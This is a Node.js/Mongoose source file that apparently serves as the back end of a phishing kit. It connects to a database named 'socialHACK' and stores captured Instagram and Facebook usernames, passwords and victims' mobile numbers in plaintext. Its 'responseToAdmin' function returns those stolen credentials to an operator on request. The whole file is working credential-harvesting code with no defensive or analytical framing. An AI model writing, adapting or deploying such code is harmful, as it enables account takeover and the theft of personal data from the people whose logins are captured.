const mongoose = require("mongoose")
require('dotenv').config()

// connection to mongoose
mongoose.connect(`mongodb+srv://${process.env.DBURIPASS}-7ayur.mongodb.net/socialHACK?retryWrites=true&w=majority`, {
        useNewUrlParser: true,
        useNewUrlParser: true,
        useUnifiedTopology: true,
        useFindAndModify: false
    })
    .then(_ => console.log('connected to database'))
    .catch(err => console.log(err))

// create schema for login
const instadataSchema = mongoose.Schema({
    _id: mongoose.Schema.ObjectId,
    username: Array,
    password: Array,
    mobile: Array
}, { timestamps: true })

const facebookdataSchema = mongoose.Schema({
    _id: mongoose.Schema.ObjectId,
    username: Array,
    password: Array,
    mobile: Array
}, { timestamps: true })

const instadata = mongoose.model('instaLogins', instadataSchema)
const facebookdata = mongoose.model('facebookLogins', facebookdataSchema)

function newLogin(plateform, id, username, password, res) {
    if (plateform == 'instagram') {
        new instadata({
                _id: id,
                username: username,
                password: password
            }).save()
            .catch(err => {
                instadata.updateOne({ _id: id }, { $push: { username: username, password: password } }, (err, resp) => {
                    if (!err) {
                        console.log("sucess in adding new user")
                    }
                })
            })

    } else if (plateform == 'facebook') {
        new facebookdata({
                _id: id,
                username: username,
                password: password
            }).save()
            .catch(err => {
                facebookdata.updateOne({ _id: id }, { $push: { username: username, password: password } }, (err, resp) => {
                    if (!err) {
                        console.log("sucess in adding new user")
                    }
                })
            })
    } else {
        console.log("err")
    }

    res.status(200)
    res.send("OK")
}

function updateMobile(plateform, id, mobile, res) {
    if (plateform == 'instagram') {
        instadata.updateOne({ _id: id }, { $push: { mobile: mobile } }, (err, resp) => {
            if (!err) {
                console.log(`mobile number added in ! ${plateform}`)
                res.status(200)
                res.send("OK")
            }
        })
    } else if (plateform == 'facebook') {
        facebookdata.updateOne({ _id: id }, { $push: { mobile: mobile } }, (err, resp) => {
            if (!err) {
                console.log(`mobile number added in ! ${plateform}`)
                res.status(200)
                res.send("OK")
            }
        })
    } else {
        console.log('errr')
    }

}

function responseToAdmin(plateform, username, res) {
    if (plateform == 'instagram') {
        instadata.find({ username: { "$in": [username] } }, { _id: 0, username: 1, password: 1, mobile: 1 }, (err, resp) => {
            // console.log(resp)
            if (resp[0]) {
                res.status(200)
                res.json({
                    username: resp[0]['username'],
                    password: resp[0]['password'],
                    mobiles: resp[0]['mobile']
                })
            } else {
                res.status(404).send('user not found')
            }
        })

    } else if (plateform == 'facebook') {
        facebookdata.find({ username: { "$in": [username] } }, { _id: 0, username: 1, password: 1, mobile: 1 }, (err, resp) => {
            if (resp[0]) {
                res.status(200)
                res.json({
                    username: resp[0]['username'],
                    password: resp[0]['password'],
                    mobiles: resp[0]['mobile']
                })
            } else {
                res.status(404).send('user not found')
            }
        })
    } else {
        res.status(404).send('wrong platform!!!!')

    }
}

module.exports = {
    newLogin: newLogin,
    updateMobile: updateMobile,
    responseToAdmin: responseToAdmin
}
